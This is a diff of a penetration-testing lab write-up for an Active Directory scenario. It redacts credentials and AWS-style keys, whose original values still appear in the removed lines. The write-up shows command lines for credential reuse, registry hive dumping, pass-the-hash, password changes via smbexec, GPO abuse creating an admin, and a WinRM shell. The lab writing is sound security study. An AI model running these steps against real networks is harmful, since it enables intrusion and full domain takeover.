@@ -14,7 +14,6 @@ tags: ["windows", "linux", "ssti", "active-directory", "gpo-abuse", "backup-oper
 
 ## Overview
 
-**Platform:** HackSmarter
 **Difficulty:** Hard
 **Domain:** hsm.local
 
@@ -44,46 +43,6 @@ The engagement identified critical vulnerabilities across all three systems:
 - **GPO misconfiguration** (GenericWrite) enabling privilege escalation to Domain Admin
 
 **Risk Rating:** Critical
-
----
-
-## Attack Path Overview
-
-```
-┌─────────────────────────────────────────────────────────────────┐
-│  SSTI (Web App) → Shell as ghill_sa → SSH Key → Root on Linux  │
-└─────────────────────────────────────────────────────────────────┘
-                              │
-                              ▼
-┌─────────────────────────────────────────────────────────────────┐
-│           Credential Reuse → RDP to WKST-01                     │
-└─────────────────────────────────────────────────────────────────┘
-                              │
-                              ▼
-┌─────────────────────────────────────────────────────────────────┐
-│         Backup Operators → SAM Dump → Admin Hash                │
-└─────────────────────────────────────────────────────────────────┘
-                              │
-                              ▼
-┌─────────────────────────────────────────────────────────────────┐
-│              PTH → SMBClient → Flag (user2.txt)                 │
-└─────────────────────────────────────────────────────────────────┘
-                              │
-                              ▼
-┌─────────────────────────────────────────────────────────────────┐
-│        Domain User (bbarkinson) → WinRM to DC01                 │
-└─────────────────────────────────────────────────────────────────┘
-                              │
-                              ▼
-┌─────────────────────────────────────────────────────────────────┐
-│       GPO Abuse (GenericWrite) → Local Admin (john)             │
-└─────────────────────────────────────────────────────────────────┘
-                              │
-                              ▼
-┌─────────────────────────────────────────────────────────────────┐
-│                    Domain Admin Access                          │
-└─────────────────────────────────────────────────────────────────┘
-```
 
 ---
 
@@ -171,8 +130,8 @@ LinPEAS revealed exposed EC2 security credentials:
 
 ```json
 {
-  "AccessKeyId": "ASIAZUVOFBPTLA5DGH2O",
-  "SecretAccessKey": "899DO5CydZ7LE9FKhnksruVA6Hg61CzcTfJYPuUL",
+  "AccessKeyId": "[REDACTED]",
+  "SecretAccessKey": "[REDACTED]",
   "Token": "[REDACTED]"
 }
 ```
@@ -210,7 +169,7 @@ hashcat -m 1800 hash.txt /usr/share/wordlists/rockyou.txt
 **Cracked Credentials:**
 
 ```
-ghill_sa : P@ssw0rd!
+ghill_sa : [REDACTED]
 ```
 
 ## 2.3 RDP Access Validation
@@ -218,11 +177,11 @@ ghill_sa : P@ssw0rd!
 Testing credential reuse against the Windows workstation:
 
 ```bash
-nxc rdp 10.1.217.65 -u ghill_sa -p 'P@ssw0rd!' --local-auth
+nxc rdp 10.1.217.65 -u ghill_sa -p '[REDACTED]' --local-auth
 ```
 
 ```
-RDP  10.1.217.65  3389  EC2AMAZ-NS87CNK  [+] EC2AMAZ-NS87CNK\ghill_sa:P@ssw0rd! (admin)
+RDP  10.1.217.65  3389  EC2AMAZ-NS87CNK  [+] EC2AMAZ-NS87CNK\ghill_sa:[REDACTED] (admin)
 ```
 
 **Credential reuse confirmed!** The same password works on the Windows workstation.
@@ -234,10 +193,10 @@ Upon RDP access, a shared folder was discovered containing credentials:
 ```
 Username        Password         Source File
 ───────────────────────────────────────────────────────
-fin_user1       Spring2025!      Finance_Access.txt
-hr_admin        Welcome123!      HR_Portal_Login.txt
-intranet_admin  Intra#Access     Intranet_Admin.txt
-ops_mgr         OpsSecure2025    Operations_Notes.txt
+fin_user1       [REDACTED]       Finance_Access.txt
+hr_admin        [REDACTED]       HR_Portal_Login.txt
+intranet_admin  [REDACTED]       Intranet_Admin.txt
+ops_mgr         [REDACTED]       Operations_Notes.txt
 bbarkinson      [Domain User]    AD Configuration
 ```
 
@@ -256,7 +215,7 @@ This group has special privileges to read any file on the system for backup purp
 Using Backup Operators privileges to extract registry hives via Impacket's reg.py:
 
 ```bash
-reg.py ghill_sa:'P@ssw0rd!'@10.1.217.65 backup -o 'C:/users/ghill_sa/desktop'
+reg.py ghill_sa:'[REDACTED]'@10.1.217.65 backup -o 'C:/users/ghill_sa/desktop'
 ```
 
 **Files Extracted:**
@@ -307,7 +266,7 @@ smbclient.py -hashes :<redacted> administrator@10.1.217.65
 Used smbexec method to change administrator password for RDP access:
 
 ```bash
-nxc smb 10.1.217.65 -u administrator -H '<redacted>' --local-auth --exec-method=smbexec -X 'net user administrator Password123!'
+nxc smb 10.1.217.65 -u administrator -H '<redacted>' --local-auth --exec-method=smbexec -X 'net user administrator [REDACTED]'
 ```
 
 ```
@@ -400,23 +359,23 @@ pygpoabuse.py hsm.local/bbarkinson -hashes :<redacted> -gpo-id "526CDF3A-10B6-4B
 **Default Credentials Created by pyGPOAbuse:**
 
 ```
-john : H4x00r123..
+john : [REDACTED]
 ```
 
 ## 3.6 Admin Access Verification
 
 ```bash
-nxc smb 10.1.50.226 -u john -p 'H4x00r123..'
+nxc smb 10.1.50.226 -u john -p '[REDACTED]'
 ```
 
 ```
-SMB  10.1.50.226  445  DC01  [+] hsm.local\john:H4x00r123.. (admin) - Pwn3d!
+SMB  10.1.50.226  445  DC01  [+] hsm.local\john:[REDACTED] (admin) - Pwn3d!
 ```
 
 ## 3.7 Domain Admin Shell
 
 ```bash
-evil-winrm -i 10.1.50.226 -u john -p 'H4x00r123..'
+evil-winrm -i 10.1.50.226 -u john -p '[REDACTED]'
 ```
 
 **Domain Admin shell obtained!**
@@ -428,18 +387,18 @@ evil-winrm -i 10.1.50.226 -u john -p 'H4x00r123..'
 ```
 Phase 1 - Linux Web Server (10.1.21.127)
 ────────────────────────────────────────────────────────────────
-ghill_sa        : P@ssw0rd!           → User (SSTI RCE)
+ghill_sa        : [REDACTED]           → User (SSTI RCE)
 root            : [SSH Key Auth]      → Root (via id_ed25519)
 
 Phase 2 - WKST-01 (10.1.217.65)
 ────────────────────────────────────────────────────────────────
-ghill_sa        : P@ssw0rd!           → Backup Operators (RDP)
+ghill_sa        : [REDACTED]           → Backup Operators (RDP)
 Administrator   : [NTLM Hash PTH]     → Local Admin (SMBClient)
 
 Phase 3 - DC01 (10.1.50.226)
 ────────────────────────────────────────────────────────────────
 bbarkinson      : [NTLM Hash PTH]     → Domain User (WinRM)
-john            : H4x00r123..         → Domain Admin (GPO Abuse)
+john            : [REDACTED]         → Domain Admin (GPO Abuse)
 ```
 
 ---
